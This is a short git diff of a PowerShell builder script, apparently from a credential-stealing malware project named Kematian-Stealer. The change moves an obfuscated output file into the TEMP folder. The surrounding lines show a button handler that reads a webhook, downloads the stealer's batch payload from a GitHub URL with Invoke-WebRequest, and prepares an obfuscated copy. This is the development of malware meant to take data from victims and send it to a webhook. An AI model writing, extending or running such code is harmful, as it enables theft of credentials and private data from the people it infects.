@@ -132,7 +132,7 @@ $button.Add_Click({
     if (-not [string]::IsNullOrWhiteSpace($webhook)) {
         $url = "https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/main.bat"
         $filePath = "$env:TEMP\main.bat"
-        $filePathprotect = ".\main_obf.bat"
+        $filePathprotect = "$env:TEMP\main_obf.bat"
         
         # Download the file
         Invoke-WebRequest -Uri $url -OutFile $filePath
